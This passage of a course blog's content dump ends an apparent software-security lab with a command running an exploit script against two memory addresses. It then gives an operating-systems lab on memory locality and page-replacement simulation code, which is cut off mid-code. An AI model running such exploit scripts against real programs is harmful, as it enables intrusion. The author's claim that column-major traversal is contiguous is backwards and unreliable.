class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_prog2_3.sh 0804850b 0804a00c</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614172148953.png"alt="image-20240614172148953" /><figcaption aria-hidden="true">image-20240614172148953</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614173640106.png"alt="image-20240614173640106" /><figcaption aria-hidden="true">image-20240614173640106</figcaption></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> HUST 实验报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Operating System Lab3: Memory Management</title>
      <link href="/zh/2023/12/05/HUST-Labs/HUST%20Operating%20System%20Lab3:%20Memory%20Management/"/>
      <url>/zh/2023/12/05/HUST-Labs/HUST%20Operating%20System%20Lab3:%20Memory%20Management/</url>
      
        <content type="html"><![CDATA[<h1 id="操作系统实验3内存管理">操作系统实验3：内存管理</h1><h2 id="实验目标">实验目标</h2><ol type="1"><li><p>理解页面置换算法原理，并编写程序演示页面置换算法。</p></li><li><p>验证Linux虚拟地址到物理地址转换的机制。</p></li><li><p>理解并验证程序执行局部性的原理。</p></li><li><p>理解并验证页面错误处理过程。</p></li></ol><h2 id="实验内容">实验内容</h2><ol type="1"><li><p>编写一个在Win/Linux中遍历2D数组的程序，以理解局部性原理。</p></li><li><p>在Windows/Linux中模拟并实现OPT、FIFO或LRU页面置换算法。</p></li><li><p>研究并修改Linux内核的页面错误处理函数do_no_page（新版本应为handle_mm_fault）或页面帧分配函数get_free_page，并使用printk打印调试信息。注意：需要内核编译。<strong>推荐：UbuntuKylin或Kylin系统</strong>。</p></li><li><p>在Linux中使用/proc/pid/pagemap技术计算变量或函数的虚拟地址对应的物理地址。<strong>推荐：UbuntuKylin或Kylin系统</strong>。</p></li></ol><h2id="任务1编写2d数组遍历程序以理解程序局部性原理">任务1：编写2D数组遍历程序以理解程序局部性原理</h2><h3 id="任务要求">任务要求</h3><ol type="1"><li><p>尽可能增大数组，并尝试改变数组大小和内外循环的顺序。例如，将[2048]X [2048]改为[10240] x [20480]，观察它们的遍历效率。</p></li><li><p>在任务管理器中观察它们的页面错误计数或使用/proc文件系统。</p></li></ol><h3 id="代码实现">代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 行优先遍历</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">traverseRowMajor</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; arr[i].<span class="built_in">size</span>(); j++)</span><br><span class="line">        &#123;</span><br><span class="line">            sum += arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列优先遍历</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">traverseColumnMajor</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; arr[<span class="number">0</span>].<span class="built_in">size</span>(); j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sum += arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> rows, cols;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入矩阵的行数和列数（格式：x y）：&quot;</span>;</span><br><span class="line">    cin &gt;&gt; rows &gt;&gt; cols;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">arr</span>(rows, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(cols, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    rusage usage;</span><br><span class="line">    timeval start, end;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> choice;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;选择遍历方法（r: 行优先，c: 列优先）：&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    cin &gt;&gt; choice;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始前获取进程资源使用情况</span></span><br><span class="line">    <span class="built_in">getrusage</span>(RUSAGE_SELF, &amp;usage);</span><br><span class="line">    start = usage.ru_utime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">traverseRowMajor</span>(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">traverseColumnMajor</span>(arr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 完成后获取进程资源使用情况</span></span><br><span class="line">    <span class="built_in">getrusage</span>(RUSAGE_SELF, &amp;usage);</span><br><span class="line">    end = usage.ru_utime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出时间（毫秒）</span></span><br><span class="line">    <span class="type">double</span> time_taken = (end.tv_sec - start.tv_sec) * <span class="number">1000</span> + (end.tv_usec - start.tv_usec) / <span class="number">1000.0</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; fixed &lt;&lt; <span class="built_in">setprecision</span>(<span class="number">3</span>) &lt;&lt; <span class="string">&quot;消耗时间：&quot;</span> &lt;&lt; time_taken &lt;&lt; <span class="string">&quot; 毫秒\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;页面错误次数：&quot;</span> &lt;&lt; usage.ru_minflt &lt;&lt; <span class="string">&quot; 次\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="位程序编译">32位程序编译</h3><p>如果直接添加 -m32 进行编译，会报错：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-1-32bit_error.png"alt="32位编译错误" /><figcaption aria-hidden="true">32位编译错误</figcaption></figure><p>因为缺少32位库，需要安装32位库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dpkg --add-architecture i386              <span class="comment"># 添加32位架构</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install gcc-multilib g++-multilib <span class="comment"># 安装32位库</span></span><br></pre></td></tr></table></figure><h3 id="位和64位程序执行结果">32位和64位程序执行结果</h3><p>使用g++编译32位和64位可执行文件test_32和test_64，执行结果如下：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-1-result1.png"alt="64位执行结果" /><figcaption aria-hidden="true">64位执行结果</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-1-result2.png"alt="32位执行结果" /><figcaption aria-hidden="true">32位执行结果</figcaption></figure><h3 id="现象观察与分析">现象观察与分析</h3><ol type="1"><li>执行时间：<ol type="1"><li>在较小的矩阵（2048x2048）中，64位程序的执行时间略低于32位程序。</li><li>在较大的矩阵（10240x20480）中，64位程序在行优先遍历时显著快于32位程序，但在列优先遍历时，两者的时间差异不大。</li></ol></li><li>页面错误：<ol type="1"><li>对于两个程序（32位和64位），在相同的矩阵大小和遍历方法下，页面错误的次数几乎相同。</li></ol></li></ol><p>执行时间差异：</p><p>64位程序通常能更高效地处理大数据集，因为它们可以利用更大的地址空间和更高效的数据处理能力（例如，更大的寄存器和更好的内存管理）。这解释了在处理较大矩阵时，64位程序在行优先遍历中比32位程序更快。对于列优先遍历，由于内存访问模式导致频繁的缓存未命中，这可能在一定程度上抵消64位架构的优势，导致两者在大矩阵列优先遍历中的性能相似。</p><p>页面错误相似性：</p><p>页面错误的数量主要取决于程序的内存访问模式和操作系统的页面管理策略，而不是程序的位宽。因此，即使是32位和64位程序，如果它们执行相同的内存访问操作，页面错误的数量也可能非常相似。这似乎更依赖于内存访问模式和操作系统的内存管理。</p><p>但我实际上有一个问题：直观上，列优先遍历应该产生比行优先遍历更多的页面错误，因为在列优先遍历中，每个访问地址是连续的，而在行优先遍历中，每个访问地址是不连续的。但实际上，两者的页面错误数量几乎相同。</p><p><strong>GPT的回答：</strong></p><ul><li>内存分页和访问模式：<ul><li>在现代计算机系统中，物理内存是以页面管理的。如果一个矩阵的行或列跨越多个内存页面，那么行优先和列优先遍历都可能导致页面错误。</li><li>在行优先遍历中，如果矩阵的每一行跨越多个页面，那么即使访问是连续的，在访问新行时也可能发生页面错误。</li><li>在列优先遍历中，虽然每次跳到新列可能会触及新的内存页面，但如果列数据较小并且可以完全包含在一个或几个内存页面中，则页面错误的发生可能不会比行优先遍历多多少。</li></ul></li><li>缓存和预取策略：<ul><li>现代处理器具有先进的缓存和预取机制。这些机制可能在一定程度上减少列优先遍历中预期的页面错误数量。</li><li>处理器可能能够预测即将到来的内存访问模式，并将数据从主内存预加载到缓存中，因此即使是列优先访问也可能不会立即导致页面错误。</li></ul></li><li>操作系统内存管理：<ul><li>操作系统可能在内存管理中采用一些策略，例如延迟分配，这可能导致实际的页面错误数量与预期不同。</li><li>操作系统可能维护一定数量的空闲页面池，因此在早期内存访问中，页面错误的发生率可能较低。</li></ul></li><li>矩阵的物理内存布局：<ul><li>矩阵在物理内存中的实际布局也可能影响页面错误的发生。例如，如果矩阵的某些部分由于其他原因已经加载到内存中，这可能会减少特定遍历方法中的页面错误。</li></ul></li><li>整个系统的内存负载：<ul><li>如果系统上运行的其他进程消耗了大量内存，这可能会影响程序的页面错误行为。系统的整体内存负载和可用性可能导致相同操作在不同时间点的页面错误行为不同。</li></ul></li></ul><h2id="任务2模拟并实现optfifo或lru页面置换算法">任务2：模拟并实现OPT、FIFO或LRU页面置换算法</h2><h3 id="任务要求-1">任务要求</h3><ol type="1"><li><p>使用数组遍历操作模拟程序指令执行；</p></li><li><p>使用一个大数组A（例如2400个元素）模拟一个进程，数组中填充随机数。当每个元素被访问时，使用printf打印出来，模拟指令执行。数组A的大小必须是设定页面大小的整数倍（例如10个元素或16个元素等）。</p></li><li><p>使用3-8个小数组（例如数组B、数组C、数组D等）模拟分配的页面帧。小数组的大小等于页面大小（例如10个指令大小，即10个元素）。小数组包含来自大数组的相应页面内容的副本（单独构建一个页面表以描述大数组的页面与小数组索引之间的关系）。</p></li><li><p>以不同的顺序访问数组A，可以是：顺序、跳跃、分支、循环或随机。自行构建访问顺序。不同的顺序在某种程度上也反映了程序的局部性。</p></li><li><p>大数组的访问顺序可以使用rand()函数定义，以模拟与大数组A的访问顺序相对应的指令访问序列。然后将指令序列转换为相应的页面地址流，并计算不同页面置换算法的“页面错误”。当相应的“页面”未加载到小数组（例如数组B、数组C、数组D等）中时，发生页面错误。</p></li><li><p>在实验中，页面大小、页面帧数量、访问顺序和置换算法都应可调。</p></li></ol><h3 id="代码实现-1">代码实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARRAY_SIZE 2400                    <span class="comment">// 进程虚拟空间大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 10                       <span class="comment">// 页面帧大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_PAGES (ARRAY_SIZE / PAGE_SIZE) <span class="comment">// 虚拟内存中的页面数量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_FRAMES 5                       <span class="comment">// 物理内存中的页面数量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP_NUM_FRAMES 7                  <span class="comment">// 跳跃的页面数量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOOP_TIMES 3                       <span class="comment">// 循环迭代次数</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main_array[ARRAY_SIZE];        <span class="comment">// 进程虚拟空间</span></span><br><span class="line"><span class="type">int</span> frames[NUM_FRAMES][PAGE_SIZE]; <span class="comment">// 物理内存分为页面帧</span></span><br><span class="line"><span class="type">int</span> page_table[NUM_PAGES];         <span class="comment">// 页面表项（从虚拟页面帧号到物理页面帧号的映射）</span></span><br><span class="line"><span class="type">int</span> frame_table[NUM_FRAMES];       <span class="comment">// 帧表（从物理页面帧号到虚拟页面帧号的映射）</span></span><br><span class="line"><span class="type">int</span> page_faults = <span class="number">0</span>;               <span class="comment">// 页面错误数量</span></span><br><span class="line"><span class="type">int</span> algo_choice = <span class="number">0</span>;               <span class="comment">// 页面置换算法</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> frame_pointer = <span class="number">0</span>;           <span class="comment">// 用于FIFO</span></span><br><span class="line"><span class="type">int</span> frame_queue[NUM_FRAMES];     <span class="comment">// 用于FIFO</span></span><br><span class="line"><span class="type">int</span> frame_timestamp[NUM_FRAMES]; <span class="comment">// 用于LRU</span></span><br><span class="line"><span class="type">int</span> future_pages[ARRAY_SIZE];    <span class="comment">// 用于OPT</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *algo_name[<span class="number">4</span>] = &#123;<span class="string">&quot;随机置换&quot;</span>, <span class="string">&quot;OPT&quot;</span>, <span class="string">&quot;FIFO&quot;</span>, <span class="string">&quot;LRU&quot;</span>&#125;; <span class="comment">// 页面置换算法名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initialize</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="comment">// 填充随机数并初始化</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        main_array[i] = rand() % <span class="number">100000</span>;</span><br><span class="line">        future_pages[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始化页面表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PAGES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        page_table[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始化页面帧队列和时间戳</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_FRAMES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        frame_queue[i] = <span class="number">-1</span>;</span><br><span class="line">        frame_timestamp[i] = <span class="number">-1</span>;</span><br><span class="line">        frame_table[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_frame_opt</span><span class="params">(<span class="type">int</span> current_time)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 实现OPT算法</span></span><br><span class="line">    <span class="type">int</span> frame = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> max_future = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 找到在未来最长时间不会被使用的页面帧</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_FRAMES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果找到空的页面帧，直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (frame_table[i] == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            frame = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="built_in">future</span> = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = current_time; j &lt; ARRAY_SIZE; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (future_pages[j] == frame_table[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">future</span> = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">future</span> &gt; max_future)</span><br><span class="line">        &#123;</span><br><span class="line">            max_future = <span class="built_in">future</span>;</span><br><span class="line">            frame = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (max_future == <span class="number">-1</span>)</span><br><span class="line">        frame = rand() % NUM_FRAMES;</span><br><span class="line">    <span class="keyword">return</span> frame;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_frame_fifo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 实现FIFO算法，先进先出</span></span><br><span class="line">    <span class="type">int</span> frame = frame_pointer;</span><br><span class="line">    frame_pointer = (frame_pointer + <span class="number">1</span>) % NUM_FRAMES;</span><br><span class="line">    <span class="keyword">return</span> frame;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_frame_lru</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 实现LRU算法</span></span><br><span class="line">    <span class="type">int</span> lru = INT_MAX;</span><br><span class="line">    <span class="type">int</span> frame = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 找到最近最少使用的页面帧</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_FRAMES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (frame_timestamp[i] &lt; lru)</span><br><span class="line">        &#123;</span><br><span class="line">            lru = frame_timestamp[i];</span><br><span class="line">            frame = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> frame;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问页面</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">access_page</span><span class="params">(<span class="type">int</span> page_number, <span class="type">int</span> offset, <span class="type">int</span> current_time)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 页面错误，使用相应的页面置换算法</span></span><br><span class="line">    <span class="keyword">if</span> (page_table[page_number] == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 找到一个空的或应该被替换的页面帧</span></span><br><span class="line">        <span class="type">int</span> frame_number;</span><br><span class="line">        <span class="keyword">switch</span> (algo_choice)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            frame_number = find_frame_opt(current_time);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            frame_number = find_frame_fifo();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            frame_number = find_frame_lru();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            frame_number = rand() % NUM_FRAMES;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将之前的虚拟到物理页面表映射改为-1</span></span><br><span class="line">        <span class="keyword">if</span> (frame_table[frame_number] != <span class="number">-1</span>)</span><br><span class="line">            page_table[frame_table[frame_number]] = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m页面错误\033[0m，页面 %3d 加载到帧 %2d，偏移 %2d 的数据：&quot;</span>, page_number, frame_number, offset);</span><br><span class="line">        page_table[page_number] = frame_number;</span><br><span class="line">        frame_table[frame_number] = page_number;</span><br><span class="line">        <span 